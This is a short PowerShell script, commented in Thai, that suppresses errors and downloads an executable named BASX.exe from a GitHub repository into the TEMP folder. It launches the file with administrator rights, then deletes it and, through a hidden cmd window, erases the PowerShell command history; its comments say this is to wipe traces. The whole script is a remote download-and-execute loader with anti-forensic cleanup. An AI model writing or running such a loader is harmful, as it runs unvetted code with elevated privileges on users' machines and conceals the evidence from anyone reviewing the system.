# ปิด ErrorAction เพื่อไม่ให้มีตัวแดงเด้งกวนใจ
$ErrorActionPreference = 'SilentlyContinue'

# 1. ตั้งค่าไฟล์
$url = "https://github.com/silentaimv1-png/basxpanel/raw/refs/heads/main/BASX.exe"
$output = "$env:TEMP\BASX.exe"

# 2. ดาวน์โหลดไฟล์ (ใช้ WebClient เพื่อความเสถียรสูงสุด)
(New-Object System.Net.WebClient).DownloadFile($url, $output)

# 3. เช็คว่ามีไฟล์อยู่จริงแล้วถึงค่อยสั่งรัน
if (Test-Path $output) {
    # รันแบบ Admin และสั่งให้ PowerShell "รอ" จนกว่าไฟล์จะถูกเรียกสำเร็จ
    Start-Process -FilePath $output -Verb RunAs -Wait
    
    # 4. พอดับปุ๊บ ล้างร่องรอยทันที
    Remove-Item -Path $output -Force
    
    # ลบประวัติการพิมพ์ (สั่งลาผ่าน CMD เพื่อไม่ให้ติดล็อคไฟล์)
    $history = (Get-PSReadlineOption).HistorySavePath
    Start-Process cmd -ArgumentList "/c timeout /t 2 && del /f /q `"$history`"" -WindowStyle Hidden
}

# ปิด PowerShell
exit
